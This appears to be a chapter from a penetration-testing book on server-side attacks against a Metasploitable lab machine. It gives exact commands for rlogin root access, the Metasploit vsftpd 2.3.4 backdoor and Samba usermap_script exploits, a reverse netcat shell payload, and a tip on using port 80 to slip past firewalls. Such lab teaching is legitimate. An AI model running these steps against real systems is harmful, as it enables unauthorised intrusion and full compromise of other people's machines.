<p>We are now moving toward the next segment of the book, where we will be covering topics related to gaining access to computer devices. In this part, we will be looking at ways to gain access to a victim's machine. We will be hacking victims' systems using various techniques. This chapter will cover the first approach to attacking the victim's system: the server-side attack. We will perform a server-side attack using the Metasploit device and also exploitation of backdoors.</p>
<p>This chapter has the following sections:</p>
<ul>
<li>Introduction to gaining access</li>
<li>Server-side attacks</li>
<li>Server-side basics</li>
<li>Server-side attacks, Metasploit basics</li>

<p>Now you have enough information to go ahead and try to gain access to other systems, to computers, servers, web servers, and stuff like that. In this section, we're going to be talking about gaining access to computer devices. What do we mean by computer devices? Any electronic device you see is a computer. A phone, a TV, a laptop, a web server, a website, a network, a router; all of these things are computers. Each one of them has an operating system, and they have programs installed on these operating systems. In most cases, these computers are used by a user. Here, we are going to be talking about how to gain access to computers. In this example, we are going to use<span> a computer. W</span>e are going to have a Windows device <span>target, </span>and we're going to have a Linux device hacker. But the concept is always the same; getting access to computer devices is always the same. We can apply the same concepts if we are targeting a phone, a tablet, or a web server, but we will be considering them all just like a normal computer. This is very important to understand: every device we see is a computer, and they work just like our personal computer. We can set up a web server on our computer, we can make it look and act like a website, or even make it act like a TV, or, for that matter, anything we want. Literally, TVs and all such things are just simple computers with less complicated hardware in them.</p>
<p>We're going to be talking about attacking these devices from two main sides: the server side and the client side.</p>

<p>A server-side attack doesn't require any user interaction. We're going to have a computer, and we're going to see how we can gain access to that computer without the need for the user to do anything. This mostly applies to web servers, applications, and devices that don't get used much by people. People basically configure them and then they run automatically. All we have is an IP address, and we're going to see how we can test the security and gain access to that computer based on that IP. <span>Our main way of getting in is going to be the operating system that that target runs, and the applications installed on that system. Various types of server-side attacks include SQL injection attacks, buffer overflow, and denial-of-service attacks.</span></p>
<p>In this chapter, we will be focusing on server-side attacks. We will look in detail at what a server-side attack is and how to implement one.</p>

            <article>
                
<p>The second approach that we're going to try is the client-side attack. This approach will require the client, or the person who uses that computer, to do something. This could involve a number of things, such as installing an update, opening a picture, or opening a Trojan. We're going to learn how to create a Trojan, how to create backdoors, how to use social engineering to make the target person do something so that when they carry out that action, we will gain access to their computer. Information gathering is going to be crucial in this case, because we actually need to know the person that we're targeting. Various types of client-side attacks include content spoofing, cross-site scripting, and session fixation.</p>

<p>Once we get an access to the system, we will see what we can do after we gain access to this computer, regardless of the method used to gained access to it. This could involve a server-side exploit, a client-side exploit, or even just physical access, where the victim leaves their desk and you get in. We're going look at what we can do once we have access to the target, how we can further exploit that target and increase our privileges, or target other computers in the same place.</p>

                    <h1 class="header-title">Sever-side attacks</h1>
                </header>
            
            <article>
                
<p>The first thing we're going to look at is server-side attacks. These are attacks that don't require user interaction. We can use these attacks with web servers, and also use them against normal computers that people use every day. The reason why we are going to be using it against my Metasploitable (which runs Unix, and which is more of a server than a normal personal computer) is because if our target uses a personal computer, and if they're not on the same network as us, then even if we manage to get their IP address, their IP address is going to be behind a router. They'll probably be connecting through a router, and therefore, if we use the IP to try and determine what operating systems run on it and what applications are installed, we will not get much useful information because we are only going to be getting information about the router and not about the person. The person will be hiding behind the router. When we are targeting a web server, or a server in general, then the server will have an IP address and we can access that IP address directly on the internet. This attack will work if the person is on the same network and if the person has a real IP. If we can ping the person, even if it's a personal computer, then we can run all of the attacks and all of the information-gathering methods that we're going to learn about.</p>
<p>We are going to be targeting my Metasploitable machine. Before we start working on it, we will just check the network settings. Just to verify it, it is set to NAT and it's on the same network as the Kali machine. The Kali machine is going to be our attacking machine. Again, we have to check that the network is set to the NAT network and it's on the same subnet. This is very important. If we do <kbd>ifconfig</kbd>, we will be able to see our IP address as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-359 image-border" src="assets/4bd0c595-ba74-40d1-a677-8f253002d3fb.png" style="width:42.00em;height:23.25em;"/></div>
<p>If we go to my Kali machine, we should be able to ping it. As we can see in the following screenshot, when we ping on the IP, we're getting responses back from the machine, which tells us we are connected to that machine and we can get responses from it. Therefore, we can try and test its security as shown with the next screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-360 image-border" src="assets/f8893495-0acb-46f0-85e4-acf11f1d9f45.png" style="width:42.25em;height:21.75em;"/></div>
<p>Again, we can use these attacks and these approaches against any computer that we can ping. If it's a personal computer or if it's a server of any kind, as long as we can ping that location or we can ping that person, then we can launch these attacks and methods that we're going to talk about.</p>
<p>Server-side attacks work against websites, web servers, people, and normal computers, as long as we can ping them. Just to convey this idea, we will see the Metasploitable machine, which is just a normal virtual machine that we can use right here to do anything we want. We can list it using the <kbd>-ls</kbd> command, and we can even install a graphical interface. Then we will be able to use it in the way we use my Kali machine. But at the same time, it has a web server. If we try to navigate to the server, we will see that it actually has a web server and it has websites that we can actually read and browse. We're going to have a look at these websites and see how we can pen test them in the later chapters as we can see in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-361 image-border" src="assets/58a79573-9baa-4442-9dc9-c13033756460.png" style="width:85.25em;height:44.83em;"/></div>
<p>Everything is a computer, and if we can ping the IP, we can use server-side attacks. They mostly work against servers because servers always have real IPs. If the person is in the same network as we are, then we can ping them to do all of these attacks as well.</p>

                    <h1 class="header-title">Server-side attack basics</h1>
                </header>
            
            <article>
                
<p>The first step in server-side attacks is information gathering. Information gathering is very important because it will show us the operating system of the target, the installed programs, the running services on the target, and the ports associated with these services. From these installed services, we can try and get into the system. We can do this by trying the default passwords. We saw this in the network penetration testing part where the iPad had an SSH service installed that basically gave us full access to the computer if the person still uses the default password, which was alpine. We can do this with any other service, and we will do so further in this section.</p>
<p>There's a lot of people that install services and misconfigure them, so we'll have another example of this as well. Sometimes, a lot of these services are designed to give someone <span>remote</span><span> </span><span>access to that computer, but they obviously need to have some security implementations. People often misconfigure these services, so we can take advantage of these misconfigurations and gain access to these computers. Another problem with these services is that some of them might even have backdoors, and we'll see an example of that too. A lot of them will have vulnerabilities, such as remote buffer overflows or code execution vulnerabilities, and this will allow us to gain full access to the computer.</span></p>
<p>The simplest way of doing this is something that we've seen before: Zenmap. We use Zenmap with the IP. We get a list of all of these services, and then Google each one of them to see if they contain any vulnerabilities. We've seen how we can use Zenmap in previous chapters, but we just want to convey the idea that anything is a computer. We've seen before how the Metasploitable device is actually a website. It has a web server running; websites are no different than this. If we want to get the IP of a website, all we have to do is <kbd>ping</kbd>. For example, if we're targeting Facebook, we have to <kbd>ping facebook.com</kbd>, and we'll get their IP. We will have Facebook's IP and we'll be able to run Zenmap against it and get a list of all the running services on Facebook. Now, obviously we are not going to do that because we are not allowed to do that. What we are going to do is run Zenmap against this Metasploitable device, which basically is a computer device, and that's what we're interested in testing. </p>
<p>We going to run Zenmap in the same way that we did before. We will go to <span class="packt_screen">Activities</span>. We are just going to look for <span class="packt_screen">Zenmap</span> and open it. Now we are going to enter the IP of our target, of the Metasploitable device, which was <kbd>10.0.2.4</kbd> in our example. Remember that in <a href="16c0aae0-6766-4e7f-ade5-e359e50c2160.xhtml" target="_blank">Chapter 4</a>, <em>Network Penetration Testing</em> we used to put the base IP and put it over 24 to cover all the IPs around us in the network. In this case, you might be testing a remote IP. For example, in the <span>case of </span><span>Facebook, all you have to do is just put the Facebook target IP in there and test it. But since we don't have permission to do so, we are not going to do that. We do have permission to test our own device, though, which is installed on the same network as us, so that's why we will be putting in that IP. We can literally put any IP we want in there and test it. </span><span>We are going to use <span class="packt_screen">Scan</span>, and this will give us a list of all the installed applications as shown in the following screenshot:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-363 image-border" src="assets/b5b98c95-8c8f-450f-916a-b00d12420b46.png" style="width:52.33em;height:39.33em;"/></div>
<p>Once the scan is finished, we will have a lot of open ports and a lot of services. It is advisable that we go on the <span class="packt_screen">Nmap Output</span> tab, check port by port, read what the services are, and Google the names of the services. For example, we have port <kbd>21</kbd> in the following screenshot, which is an FTP port. FTP is a service that's installed to allow people to upload or download files from the remote server. FTP services usually use a username and a password, but we can see that this service has been misconfigured and it allows an anonymous FTP login. Unlike the SSH that we used before in the network penetration testing, we can use the default password. With this we will be able to log in without a password, note the next screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-364 image-border" src="assets/cd25d133-5f37-46dd-9a28-f581ea1af90d.png" style="width:64.17em;height:48.08em;"/></div>
<p>All we have to do is download an FTP client, such as FileZilla, and we will be able to connect using this IP address on port <kbd>21</kbd>. We won't go into the details of how to do it, as it is very simple. We just have to download the application and connect to it. We can also Google an FTP server, which in our case is <span class="packt_screen">vsftpd 2.3.4</span>, and see whether it has any issues, if it has any misconfigurations, or it has any known code execution exploits. Once we Google this, we can see that this particular application, <span class="packt_screen">vsftpd 2.3.4</span>, has a backdoor installed with it. It literally came with a backdoor when it was released. We need to Google the services one by one and check whether they have any misconfigurations or any exploits installed, or any known exploits.</p>
<p>Now we are going to have a look at port <kbd>512</kbd>. Let's assume we went on them one by one, we couldn't find anything, and we reached the <kbd>512</kbd> TCP port, as shown in the next screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-369 image-border" src="assets/4f7621b8-b8b3-4e15-93b6-d4262bc88856.png" style="width:85.33em;height:36.42em;"/></div>
<p>We are going to Google the service that's running on this port, as we don't know what it is. After a little Googling, we know that <span class="packt_screen">netkit-rsh</span> is a remote execution program. If we manage to log in with this, we'll be able to execute commands on the target computer, and it uses the <kbd>rsh rlogin</kbd>, which is a program that ships with Linux. It allows us, similar to SSH, to execute remote commands on the target computer. Let's go back and see how we can connect to the <kbd>rsh rlogin</kbd> service. Let's look at the <kbd>netkit-rsh</kbd> package, and what comes with this package. As we can see, this is Ubuntu. The target computer system is running on Ubuntu, and we can see that in here it uses the <kbd>rsh-client</kbd> service to connect. W<span>e need to install a</span> package to connect to that service. It is a client program for a remote shell connection. Now go back, and let's install <kbd>rsh-client</kbd>. As we did before when we needed to install something, we run <kbd>apt-get</kbd>, and we do <kbd>install</kbd>. We'll type the name of the program that we want to install, so it's <kbd>rsh-client</kbd>. The command to install <kbd>rsh-client</kbd> is as follows:</p>
<pre><strong> apt-get install rsh-client </strong></pre>
<p><kbd>apt-get</kbd> is going to install it for us and configure it, and once it's installed, we're going to use <kbd>rlogin</kbd> to log in, because the first page told us that it uses the <kbd>rlogin</kbd> program to facilitate the login process. We are going to do <kbd>rlogin</kbd>, and again, if we don't know how to use this app, we use <kbd>--help</kbd> to see how to use it, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-371 image-border" src="assets/06e6474a-efa7-4831-bd5d-b4ebdcc02e3c.png" style="width:39.50em;height:3.58em;"/></div>
<p><span>What's important here is the username (<kbd>-l</kbd>) and the <kbd>host</kbd>, which is the target IP. Now we are going to do <kbd>rlogin</kbd></span>. W<span>e are going to put the username as <kbd>root</kbd>, which is the user with the most privileges on the system, and we'll put the target IP, which is <kbd>10.0.2.4</kbd>. Here is the command:</span></p>
<pre class="mce-root CDPAlignLeft CDPAlign"><strong>rlogin -l root 10.0.2.4</strong> </pre>
<p><span>And now we are logged into the Metasploitable machine. If we execute the </span><kbd>id</kbd><span> command to get the ID, we can see that we are <kbd>root</kbd>. If we do a <kbd>uname -a</kbd> it will list the hostname and the kernel that's running on the machine. We can see that we are in the Metasploitable machine with <kbd>root</kbd> access, shown as follows:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-372 image-border" src="assets/b61e8508-8c6a-4441-8562-c6da39bdb543.png" style="width:66.83em;height:5.83em;"/></div>
<p><span>This is a basic manual way of gaining access to the target computer by exploiting the misconfiguration of an installed service. The <kbd>rlogin</kbd> service was not configured properly. All we had to do was just Google what came with that port, and we managed to log in and gain full access to the target computer.</span></p>
<div class="packt_tip"><span>Again, the key point here is we do a Zenmap scan and then go to each port that we find. We Google that port and look for misconfigurations and default passwords. If this target service came in with a backdoor or code execution, maybe it just wasn't programmed properly or it had a flaw that can be used to gain access to that computer. </span></div>

                </header>
            
            <article>
                
<p>In this section, we're going to look at an example of a very simple thing: a backdoor. Some programs or services are shipped with backdoors embedded in them. We're going to exploit this, and we are choosing this very simple exploit because we are going to look at a framework called Metasploit. We will be using this framework a lot. We are going to start with something simple and then we're going to go deeper into the framework. First, let's look at how we can find that exploit. Again, using the same method that we've always been using, we have an Nmap scan; as we know, we're going to go on each port and Google them, looking for exploits. We are going to Google the service name <kbd>vsftpd 2.3.4 exploit</kbd>. <span><span>I</span></span>t's the service name followed by <kbd>exploit</kbd>. We can see that the first result comes in from a website called Rapid7. Rapid7 is a company that makes the Metasploit framework, so that's why we chose this particular exploit. We're going to exploit this service, or this problem, using Metasploit. Rapid7 will tell us that the 2.3.4 version of FTP has a backdoor command execution, so we can basically execute commands on the target computer if it has this program installed. And from Nmap, we know that this program is installed, which means that we can execute commands on the target machine.</p>
<p>Metasploit, as we have said, is made by Rapid7. It is a huge framework that contains a large number of exploits. It allows you to exploit vulnerabilities or create your own exploits. If you are an expert and you know how to discover and make exploits, then Metasploit will help you do that. For now, we're making use of a very simple existing vulnerability. The commands on Metasploit are very easy. They might seem a bit complicated at first, but once we get used to them, they are very easy to use, and a lot of them are generic commands. Here, we will show you the basic generic commands.</p>
<p class="mce-root"/>
<p>There are other commands that we will get used to in time:</p>
<ul>
<li><strong> </strong><kbd>msfconsole</kbd>: This just launches the Metasploit program.</li>
<li><kbd>help</kbd>: With this, we can get information about the commands and a description of how we can use them.</li>
<li><strong> </strong><kbd>show</kbd>: This shows the available exploits. We can show the available auxiliaries and the available payloads. We'll talk about what each of these mean in the future.</li>
<li><kbd>use</kbd>: This command is used to use something that we have shown. For example, we show the exploits and we pick a certain exploit that we want to use. Then we use the <kbd>use</kbd> command and we type in the exploit name to run it.</li>
<li><kbd>set</kbd>: The <kbd>set</kbd> command is used to set specific options for the exploit. For example, if we want to set the IP address of our target, we set the IP and then we enter the value of the IP that we want to set it to. </li>
<li><kbd>exploit</kbd>: A<span>t the end, once we finish configuring,</span> we can type in <kbd>exploit</kbd> to execute that exploit.</li>
</ul>
<p>We went on Nmap, we Googled the name of the service, and the first thing that came up is that this service has a backdoor command execution. Because this is on Rapid7, the vulnerability is exploitable using Metasploit, and the module name that we're going to be using is <kbd>exploit.unix/ftp/vsftpd_234_backdoor</kbd> to exploit this vulnerability.</p>
<p>Now we will go to our console, and we will launch Metasploit using the <kbd>msfconsole</kbd><span> command,</span><span> and we're going to run </span><kbd>use</kbd> <span>and then put the name of the exploit, which is</span><span> </span><span><kbd>exploit.unix/ftp/vsftpd_234_backdoor</kbd></span><span>:</span></p>
<pre><strong>use exploit/unix/ftp/vsftpd_234_backdoor</strong></pre>
<p>As we can see in the following screenshot, the name changed to <kbd>exploit</kbd> and then the name of exploit that we're using:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-375 image-border" src="assets/b84e84ba-62ad-4c32-b4d9-67f97706a602.png" style="width:36.00em;height:3.00em;"/></div>
<p>Then we're going to use the <kbd>show</kbd> command to show the options that we need to set. As we know, <kbd>show</kbd> is a generic command that we can use in a number of cases. In this case, we're doing <kbd>show options</kbd> to see all the options that we can change for this particular exploit. As you can see in the following screenshot, the second option is the port that the service is running on. It's already set to port <kbd>21</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-376 image-border" src="assets/464d8448-97ca-4802-aee4-bd7392af770b.png" style="width:31.67em;height:16.42em;"/></div>
<p><span>If we go back to Nmap, we will see that our target FTP client, or server, is running on port <kbd>21</kbd>. We don't need to change any of that. What we need to change is <kbd>RHOST</kbd>. <kbd>RHOST</kbd> is the target IP address<span>, and we're going to set <kbd>RHOST</kbd>, and that's the IP address of my target Metasploitable machine. We use <kbd>set</kbd>, and after <kbd>set</kbd> we put the option name. If we want to change the port, we set <kbd>RPORT</kbd>, but we are changing the <kbd>RHOST</kbd> to <kbd>10.0.2.4</kbd>. As explained at the start of this topic, we're going to use the <kbd>set</kbd> option, or the <kbd>set</kbd> command. The command is going to be as follows:</span></span></p>
<pre><strong>set RHOST 10.0.2.4</strong></pre>
<p><span><span>Press <em>Enter</em>, and as we can see now, in the next screenshot, the <kbd>RHOST</kbd> is set to <kbd>10.0.2.4</kbd>:</span></span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-377 image-border" src="assets/4c8d319a-ef59-491c-9bda-eaef4db8ee36.png" style="width:30.83em;height:2.08em;"/></div>
<p><span>Now we will do <kbd>show options</kbd> again just to make sure that everything is configured correctly, and as you can see in the following screenshot, <kbd>RHOST</kbd> has been changed to <kbd>10.0.2.4</kbd>:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-378 image-border" src="assets/9e00cbab-19dc-4122-b92b-82b8c7e946cf.png" style="width:31.92em;height:16.83em;"/></div>
<p><span>Everything is ready now. To execute the <kbd>exploit</kbd>, we just type in <kbd>exploit</kbd>. We can see in the following screenshot that the <kbd>exploit</kbd> was run successfully, and now we have access to the target computer. If we do <kbd>id</kbd> we will see that our <kbd>UID</kbd> is <kbd>root</kbd>:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-381 image-border" src="assets/e03f0557-7292-429b-90f0-f94c9e37f3e6.png" style="width:74.25em;height:16.42em;"/></div>
<p><span>Now basically we are running Linux commands here, so if we do a <kbd>uname -a</kbd> we will see that this is my Metasploitable machine, and if we do <kbd>ls</kbd> then it'll list the files for us. If we do <kbd>pwd</kbd> it'll show us where we are, and we can use Linux commands to do anything we want on the target machine:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-382 image-border" src="assets/964b623d-22fc-4ccf-8004-9c0e0fa7652b.png" style="width:67.17em;height:42.17em;"/></div>
<p><span>Now this was a very simple use of Metasploit. In the future, we're going to be using it for more advanced actions.</span></p>

            <article>
                
<p>Now we're going to have a more advanced look at Metasploit, and we'll see how to use it to exploit a vulnerability that exists in a certain service. It's a code execution vulnerability that will give us full access to the target computer. Coming back to our results in Nmap, we're going to do the same thing that we've been doing for a while: we copy the service name and see whether it has any vulnerabilities. For now, we're having a look at port <kbd>139</kbd>, which has a Samba server version 3.X. We're going to go to Google, just like we did in the previous section, and we're going to look for <kbd>Samba 3.X exploit</kbd>. You will see there's a number of results. The one that we're interested in is from Rapid7, because, as mentioned earlier, these are the people that make Metasploit, so the exploits that we see there can be used through Metasploit. The exploit we'll be using is <span class="packt_screen">username map script</span>. It's a command execution vulnerability. The name of the vulnerability is <kbd>exploit/multi/samba/usermap_script</kbd>, so it's the same thing that we used before with the evil backdoor in the FTP service. This is just a different name that we're going to use, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-383 image-border" src="assets/d8d342c9-fef3-4ef5-9339-1ce62bd8d9b4.png" style="width:48.33em;height:35.17em;"/></div>
<p>We will go to Metasploit and run <kbd>msfconsole</kbd>. We will be writing a command like we did in the previous section. We write <kbd>use</kbd>, and then we are going to type the name of the exploit that we want to use. The next thing that we are going to do is <kbd>show options</kbd>. The command will be as follows:</p>
<pre><strong>use exploit/multi/samba/usermap_script<br/>show options</strong></pre>
<p>Here is the output of the preceding command:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-384 image-border" src="assets/c7d8fe26-1f88-4244-84be-033a267bb208.png" style="width:32.58em;height:18.17em;"/></div>
<p>Using these exploits is always pretty much the same. The only difference is the <kbd>options</kbd> that we can set for each exploit. We always run <kbd>use</kbd> and then we type in the exploit name, and then do <kbd>show options</kbd> to see what we can change to work with this exploit. In the future, we probably will get different exploits than what we have now. Every time we want to run an exploit, we do <kbd>use &lt;exploit name&gt;</kbd>, and then we do <kbd>show options</kbd> to see the options that we want to configure. But using the exploits and setting the options and running them is always the same.</p>
<p>We will learn a few examples that should cover pretty much everything that we want to do in the future. Again, we need to set up <kbd>RHOST</kbd>, which is the IP of the target computer, and we're going to do it the same way that we did before. As setting the <kbd>options</kbd> is always the same, so we're going to do <kbd>set RHOST</kbd>, and then we're going to put the IP of the target computer, which is <kbd>10.0.2.4</kbd>. Exactly like we did before, we're using the <kbd>set</kbd> command to set an option, which is the <kbd>RHOST</kbd>. We're going to run <kbd>show options</kbd>, and as we can see in the following screenshot, the <kbd>RHOST</kbd> will be set correctly according to the specified IP:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-385 image-border" src="assets/ecce93f1-d64d-47bb-bf8c-30b13e0a6b43.png" style="width:34.00em;height:19.00em;"/></div>
<p>This is where things differ from the previous section. In the preceding section, we used a backdoor that was already installed on the target computer, so all we had to do was connect to the backdoor and then we could run any Linux commands on the target computer. In this section, the target computer does not have a backdoor; it has a normal program that has a buffer overflow or a code execution vulnerability. The program doesn't have any code that allows us to run Linux commands. It has a certain flaw that will let us run a small piece of code. These small pieces of code are called <strong>payloads</strong>. What we need to do is create a payload and then run it on the target computer using the vulnerability that we found. That piece of code will allow us to do different things. The payload is what allows us to do things that are useful to us.</p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Now, the payload might let us do Linux commands, and there are other types of payload we'll look at in the future. <span>To see the payloads that you can use with this particular exploit, all you have to do is run the <kbd>show payloads</kbd> command. We can use different types of payload, as shown in the following screenshot:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-386 image-border" src="assets/b482b5d3-9ac2-4852-81f1-8b021dc0f0bd.png" style="width:84.33em;height:57.25em;"/></div>
<p>Payloads are small pieces of code that will be executed on the target computer once the vulnerability has been exploited. When we exploit the vulnerability, the code that we're going to pick will be executed, and depending on the type of payload we choose, that payload will do something that is useful to us. Right now, we can see that all the payloads are command line, so they let us run commands on the target computer, just like Linux commands. And all of them only run on Unix, because our target is Linux.</p>
<p>There are two main types of payloads:</p>
<ul>
<li><strong>Bind payloads</strong>: All they do is open a port on the target computer, and then we can connect to that port.</li>
<li><strong>Reverse payloads</strong>:<strong> </strong>They do the opposite of bind payloads. They open a port in my machine and then they connect from the target computer to our machine. This is useful because this allows us to bypass firewalls. Firewalls filter any connections going to the target machine, but if the target machine connects to us and we don't have a firewall, then we will be able to bypass the firewall.</li>
</ul>
<p>We will be using the <kbd>cmd/unix/reverse_netcat</kbd> payload. The last part of these payloads are the programming language or the tool that's going to be used to facilitate the connection. For example, we can see in preceding screenshot that there are payloads written in Perl, Ruby, Python, PHP, or using Netcat, which is a tool that allows connections between computers. The <kbd>cmd/unix/reverse_netcat</kbd><span> payload </span>is the one that we are going to use, and we are going to use it in the same way we use an exploit. We are just going to use it using the <kbd>set</kbd> command. The command will be as follows:</p>
<pre><strong>set PAYLOAD <span>cmd/unix/reverse_netcat</span></strong></pre>
<p>The same way you set an <kbd>option</kbd>, we're going to set payload. We do <kbd>show options</kbd> to see if there are any other <kbd>options</kbd> that we need to <kbd>set</kbd>, and because we picked a payload, there are more <kbd>options</kbd>. As you can see in the following screenshot, there is an option called <kbd>LHOST</kbd>, and it's the listening address, which is our own address:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-387 image-border" src="assets/c4816ec1-da1f-42f9-ba5e-41fe63aa69fa.png" style="width:35.08em;height:22.83em;"/></div>
<p>We are going to get our own IP address using <kbd>ifconfig</kbd>, and our address for this example is <kbd>10.2.0.15</kbd>, shown as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-388 image-border" src="assets/f0d945f2-099f-4730-98ec-2c2f0b762d53.png" style="width:36.08em;height:18.25em;"/></div>
<p>We are going to set the <kbd>LHOST </kbd>in the same way that we set the <kbd>RHOST</kbd> before. We set the <kbd>LHOST</kbd> to <kbd>10.2.0.15</kbd>. Before, we used <kbd>set RHOST</kbd> to set this option. Now we're setting the <kbd>LHOST</kbd> to set this particular option. The <kbd>set</kbd> command is really simple: <kbd>set</kbd>, the <kbd>&lt;option name&gt;</kbd>, and then the <kbd>&lt;value&gt;</kbd> that we want to set it to:</p>
<pre><strong>set LHOST 10.0.2.15</strong></pre>
<p>Then we are going to do <kbd>show options</kbd>, and everything seems fine, as shown in the next screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-389 image-border" src="assets/e5492ef4-4989-4346-9e58-b8cbc625ec29.png" style="width:34.58em;height:28.50em;"/></div>
<p>We're using this exploit. The <kbd>RHOST</kbd> is set to <kbd>10.0.2.4</kbd>, which is OK, and then the <kbd>LHOST</kbd> is set to <kbd>10.0.2.15</kbd>, which is perfect, and then we can also set the port that you're going to be listening on on your current computer. You can actually set it to <kbd>80</kbd> if you want to. That's the port that is used by web browsers. If we set the <kbd>LPORT</kbd> to <kbd>80</kbd>, the target computer will try to connect to us using port <kbd>80</kbd>, which is never filtered on firewalls because that's the port that web browsers, or web servers, use. Whenever we access a website, we actually access port <kbd>80</kbd> on that website. If we open port <kbd>80</kbd> on our machine and the target connects to us on port <kbd>80</kbd>, then the firewall will think that the target is only browsing the internet. We are not going to do that now because we have a web server running on port <kbd>80</kbd> and that will conflict. We are just going to <kbd>set</kbd> the <kbd>LPORT</kbd> to <kbd>5555</kbd>, in the same way as <kbd>LHOST</kbd>. We are going to do <kbd>show options</kbd> again, and as we can see in the following screenshot, that port has been changed to <kbd>5555</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-390 image-border" src="assets/3e44a1d0-8a1b-4a74-8a86-48006fd903f8.png" style="width:31.92em;height:27.42em;"/></div>
<p><span>Now we are going to run the <kbd>exploit</kbd> command to run the exploit. </span>As we can see in the following screenshot, it's telling us that <kbd>session 1</kbd> has been opened and the connection is between the <kbd>10.0.2.15:5555</kbd> device and the <kbd>10.0.2.4:48184</kbd> device, which is our device and the target device:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-391 image-border" src="assets/951e4b9f-f5b1-468c-b64d-19a8a922a79c.png" style="width:55.42em;height:4.83em;"/></div>
<p>We are going to do <kbd>pwd</kbd>, and we do <kbd>id</kbd>. We will see that we are <kbd>root</kbd>. If we do <kbd>uname -a</kbd>, we will see we are in the Metasploitable machine, and if we do <kbd>ls</kbd> we will be able to list the files and so on. We can use any Linux command just like we did before in the previous section, shown as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-393 image-border" src="assets/b1150740-4f58-471a-9a8c-c1aea2c5f810.png" style="width:48.42em;height:32.58em;"/></div>

<p>In this chapter, we looked at the concept of gaining access to a machine, and we also got an overview of ways to gain access. We also looked at the basics of server-side attacks, which are the techniques of gaining access to victims' machines. We saw <span>how to use a default password or a misconfigured service to gain access to the target computer. We then</span> saw <span>how to use a service with a default password, a service that has not been configured correctly, and a service that came with a backdoor to gain full access to the target computer. We also looked at using Metasploit to connect to a backdoor that was installed on the FTP service. </span><span>The next chapter will be about using the MSFC and Nexpose tools to scan and analyze vulnerabilities.</span></p>
